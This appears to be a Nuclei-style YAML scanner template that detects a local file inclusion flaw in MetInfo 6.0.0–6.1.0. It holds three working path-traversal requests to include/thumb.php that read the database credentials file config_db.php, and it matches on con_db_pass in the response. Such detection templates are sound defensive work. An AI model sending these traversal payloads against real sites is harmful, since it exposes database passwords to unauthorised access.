http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - con_db_pass
    - con_db_name
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/include/thumb.php?dir=http/.....///.....///config/config_db.php'
  - '{{BaseURL}}/include/thumb.php?dir=.....///http/.....///config/config_db.php'
  - '{{BaseURL}}/include/thumb.php?dir=http\\..\\..\\config\\config_db.php'
  stop-at-first-match: true
id: metinfo-lfi
info:
  author: pikpikcu
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-22
  description: MetInfo 6.0.0 through 6.1.0 is vulnerable to local file inclusion and
    allows remote unauthenticated attackers access to locally stored files and their
    content.
  metadata:
    max-request: 3
  name: MetInfo <=6.1.0 - Local File Inclusion
  reference:
  - https://paper.seebug.org/676/
  severity: high
  tags: metinfo,lfi
